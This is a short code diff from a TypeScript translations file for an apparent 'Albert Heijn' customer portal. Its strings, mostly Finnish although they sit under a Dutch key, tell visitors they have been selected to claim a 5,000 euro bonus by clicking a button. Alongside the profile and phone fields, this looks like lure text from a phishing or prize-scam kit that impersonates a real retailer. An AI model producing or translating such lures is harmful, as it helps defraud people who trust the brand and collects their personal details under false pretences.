@@ -35,9 +35,11 @@ export type TranslationKeys = {
   profile_phone_label: string;
   profile_button: string;
   profile_loading_text: string;
-},
-  fi: {
-    portal_name: "Albert Heijn Asiakasportaali",
+};
+
+export const translations: Record<string, TranslationKeys> = {
+  nl: {
+    portal_name: "Albert Heijn klantenportaal",
     support_center_name: "Albert Heijn Asiakaspalvelu",
     win_title: "Ainutlaatuinen Albert Heijn -bonus",
     win_subtitle: "Onnittelut! Sinut on valittu tämän päivän Albert Heijn -kampanjaan. Napsauta alla olevaa painiketta lunastaaksesi 5 000 euron bonuksesi.",
